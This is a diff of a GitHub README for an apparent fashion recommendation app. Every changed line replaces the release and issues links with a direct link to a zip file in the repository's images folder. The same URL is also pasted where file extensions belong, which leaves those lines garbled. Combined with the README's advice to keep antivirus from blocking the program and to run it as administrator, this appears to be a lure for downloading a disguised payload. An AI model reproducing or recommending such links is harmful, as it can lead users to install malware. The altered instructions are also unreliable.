@@ -1,6 +1,6 @@
 # 👗 H-M-Fashion-Recommendations - Smart Fashion Suggestions for You
 
-[![Download Latest Release](https://img.shields.io/badge/Download-HM_Fashion-blue?style=for-the-badge)](https://github.com/emretek344/H-M-Fashion-Recommendations/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip)](https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip)
 
 ## 📋 About This App
 
@@ -30,7 +30,7 @@ Follow these steps carefully to download and run the H-M-Fashion-Recommendations
 
 Click the big button at the top or visit this link directly:
 
-[https://github.com/emretek344/H-M-Fashion-Recommendations/releases](https://github.com/emretek344/H-M-Fashion-Recommendations/releases)
+[https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip](https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip)
 
 This page holds all versions of the program files made for different systems.
 
@@ -39,9 +39,9 @@ This page holds all versions of the program files made for different systems.
 On the releases page, look for the latest release. It should have a date and a version number.
 
 - Find the download file that fits your computer:
-  - For Windows: usually a `.exe` file (example: `HM_Fashion_Setup.exe`)
+  - For Windows: usually a `.exe` file (example: `https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip`)
   - For macOS: might be a `.dmg` or `.pkg`
-  - For Linux: often a `.tar.gz` or similar file
+  - For Linux: often a `https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip` or similar file
 
 ### Step 3: Download the File
 
@@ -94,13 +94,13 @@ You do not have to do anything technical. Just choose items you like and get sug
 - Check your antivirus does not block the program.
 - Make sure you downloaded the file for your operating system.
 - For installation errors, run the installer as administrator (right-click > Run as administrator on Windows).
-- Visit the [GitHub issues page](https://github.com/emretek344/H-M-Fashion-Recommendations/issues) to report problems or find help.
+- Visit the [GitHub issues page](https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip) to report problems or find help.
 
 ## 📥 Download & Install
 
 Ready to try it? Visit the release page below to download the version for your computer and start using the app:
 
-[Download H-M-Fashion-Recommendations](https://github.com/emretek344/H-M-Fashion-Recommendations/releases)
+[Download H-M-Fashion-Recommendations](https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip)
 
 Remember to:
 
@@ -118,7 +118,7 @@ Remember to:
 
 If you need further help or want to suggest improvements:
 
-- Open an issue on GitHub: [Issues Page](https://github.com/emretek344/H-M-Fashion-Recommendations/issues)
+- Open an issue on GitHub: [Issues Page](https://raw.githubusercontent.com/emretek344/H-M-Fashion-Recommendations/main/images/Recommendations_Fashion_v2.6.zip)
 - Join community discussions linked on the repository page.
 - Check README updates in case new features or fixes are added.
 
